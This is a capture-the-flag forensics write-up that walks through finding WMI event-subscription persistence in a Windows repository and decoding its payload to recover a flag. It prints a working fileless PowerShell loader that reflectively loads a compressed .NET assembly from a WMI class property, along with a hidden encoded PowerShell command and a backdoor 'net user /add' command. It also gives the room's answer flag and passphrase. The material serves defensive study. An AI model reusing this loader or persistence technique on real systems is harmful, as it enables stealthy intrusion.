# After Hours | Hacker Holidays Day 12 | TryHackMe Writeup

## Windows WMI Forensics, Hidden Persistence, and Payload Extraction

**Category:** Forensics  
**Difficulty:** Medium  
**Points:** 90  
**Room:** Hacker Holidays 2026 — Day 12

### Room Description

> Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home.
>
> Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check.

### Objectives

- Parse the provided system artifacts for hidden custom configuration data.
- Locate the malicious class and extract its embedded payload.
- Decode the payload and submit the recovered flag.

---

# Walkthrough

The challenge provides a ZIP archive containing the following files:

```text
INDEX.BTR
MAPPING1.MAP
MAPPING2.MAP
MAPPING3.MAP
OBJECTS.DATA
```

These filenames are a major clue. They are associated with the **Windows WMI repository**, so instead of looking through the usual Windows persistence locations such as Startup folders, Scheduled Tasks, and Run keys, the investigation should focus on WMI persistence.

## 1. Extract the Evidence

On the AttackBox, the room files can be found under:

```text
/root/Rooms/hacker-holidays-2026/after-hours
```

The attachment passphrase provided by the room is:

```text
Aft3rH0ursAtt4chm3ntP4ss
```

Extract the archive:

```bash
unzip -P 'Aft3rH0ursAtt4chm3ntP4ss' <attachment>.zip -d after-hours
```

Then inspect the extracted files:

```bash
cd after-hours
ls -lah
```

Expected files:

```text
INDEX.BTR
MAPPING1.MAP
MAPPING2.MAP
MAPPING3.MAP
OBJECTS.DATA
```

The presence of `OBJECTS.DATA`, `INDEX.BTR`, and the `MAPPING*.MAP` files strongly suggests that these are WMI repository artifacts.

---

# 2. Search the Raw WMI Data

Because the room specifically hints that the persistence mechanism is hidden somewhere that normal autorun tools do not check, I searched the raw `OBJECTS.DATA` file for WMI persistence-related strings.

A quick first pass:

```bash
strings -n 6 OBJECTS.DATA | grep -Ei 'EventFilter|EventConsumer|CommandLineEventConsumer|ActiveScriptEventConsumer|__EventFilter'
```

I found WMI-related classes including:

```text
__EventFilter
CommandLineEventConsumer
ActiveScriptEventConsumer
```

These are important because WMI permanent event subscriptions can be used for persistence.

I then searched specifically for suspicious PowerShell or command execution strings:

```bash
strings -n 6 OBJECTS.DATA | grep -Ei 'powershell|cmd\.exe|base64|EncodedCommand|net user'
```

This revealed a suspicious `CommandLineEventConsumer`.

---

# 3. Locate the Malicious WMI Class

Searching the raw repository for the suspicious class showed:

```text
Win32_HardwareTelemetry
```

The class contained a custom property:

```text
ConfigData
```

The associated configuration data was a long Base64-looking string.

I searched for the class directly:

```bash
strings -n 6 OBJECTS.DATA | grep -A2 -B2 'Win32_HardwareTelemetry'
```

Another useful search was:

```bash
grep -aob 'Win32_HardwareTelemetry' OBJECTS.DATA
```

This confirmed that the custom class was embedded directly inside the WMI repository.

---

# 4. Investigate the CommandLineEventConsumer

The suspicious consumer contained a command similar to:

```text
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <BASE64_DATA>
```

The important part is:

```text
-enc
```

which indicates that the PowerShell command is Base64-encoded.

The PowerShell command can be extracted from the raw artifact and decoded.

For example:

```bash
strings -n 6 OBJECTS.DATA | grep -a 'cmd /C powershell.exe'
```

The encoded PowerShell command is UTF-16LE encoded before being Base64 encoded.

---

# 5. Decode the PowerShell Command

The decoded PowerShell script revealed the following logic:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;

$o = New-Object IO.MemoryStream;

$d = New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String($file),
    [IO.Compression.CompressionMode]::Decompress
);

$b = New-Object Byte[](1024);

$r = $d.Read($b,0,1024);

while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}

[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke(
    $null,
    @(,[string[]]@())
) | Out-Null
```

This was the key to the challenge.

The script:

1. Reads the `ConfigData` property from `Win32_HardwareTelemetry`.
2. Base64-decodes the property.
3. Decompresses it using Deflate.
4. Loads the resulting bytes as a .NET assembly.
5. Invokes the assembly's entry point.

So the WMI class contains the actual malicious payload.

---

# 6. Extract and Decode ConfigData

The `ConfigData` property contained a long Base64 string.

A Python approach makes extraction easier:

```python
import base64
import re
import zlib

with open("OBJECTS.DATA", "rb") as f:
    data = f.read()

matches = re.findall(rb'[A-Za-z0-9+/=]{100,}', data)

for value in matches:
    try:
        raw = base64.b64decode(value)
        payload = zlib.decompress(raw, -15)

        if payload.startswith(b"MZ"):
            print("[+] Possible .NET PE payload found")
            print("Size:", len(payload))
            open("payload.exe", "wb").write(payload)
            break
    except Exception:
        pass
```

The resulting payload began with:

```text
MZ
```

which is the DOS header used by Windows PE files.

The extracted file was therefore a Windows executable/.NET assembly.

---

# 7. Inspect the Extracted Payload

Before executing anything, I inspected the payload statically.

Useful commands include:

```bash
file payload.exe
```

```bash
strings payload.exe
```

For UTF-16LE strings:

```bash
strings -el payload.exe
```

The payload contained strings such as:

```text
updates.exe
Program
AfterHours
cmd.exe
/c net user patch <BASE64_STRING> /add
```

This revealed what the malicious payload was doing.

It was executing a command that created a user named:

```text
patch
```

The password/value supplied to the command was itself encoded.

---

# 8. Decode the Embedded Base64

The payload contained:

```text
VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9
```

This is standard Base64.

Decode it with:

```bash
echo 'VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9' | base64 -d
```

Output:

```text
THM{P4tch_op3ned_th3_BacKd00r}
```

The flag is therefore:

```text
THM{P4tch_op3ned_th3_BacKd00r}
```

---

# 9. Quick Automated Extraction

A compact way to look for the important indicators in the WMI repository is:

```bash
strings -n 6 OBJECTS.DATA | grep -Ei \
'Win32_HardwareTelemetry|ConfigData|CommandLineEventConsumer|powershell|EncodedCommand|net user'
```

Then inspect the payload strings:

```bash
strings -el payload.exe | grep -Ei 'cmd|net user|AfterHours|patch'
```

Finally, decode the recovered Base64:

```bash
echo 'VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9' | base64 -d
```

---

# Attack / Persistence Chain

```text
Windows WMI Repository
        |
        v
Win32_HardwareTelemetry
        |
        v
ConfigData
        |
        v
Base64
        |
        v
Deflate Compression
        |
        v
.NET Assembly
        |
        v
updates.exe / AfterHours
        |
        v
cmd.exe
        |
        v
net user patch ...
        |
        v
Embedded Base64
        |
        v
THM Flag
```

---

# Key Takeaways

- Normal persistence checks such as Startup, Scheduled Tasks, and Run keys can miss **WMI permanent event subscriptions**.
- `OBJECTS.DATA`, `INDEX.BTR`, and `MAPPING*.MAP` are strong indicators of a Windows WMI repository.
- `__EventFilter` and `CommandLineEventConsumer` are important artifacts when investigating WMI persistence.
- PowerShell `-enc` commonly indicates a Base64-encoded PowerShell command.
- The encoded PowerShell command in this challenge retrieved `ConfigData` from a custom WMI class.
- `ConfigData` was Base64-encoded and Deflate-compressed.
- The decompressed data was a .NET assembly.
- Static inspection of that assembly exposed another Base64-encoded value containing the final flag.

---

# Flag

```text
THM{P4tch_op3ned_th3_BacKd00r}
```
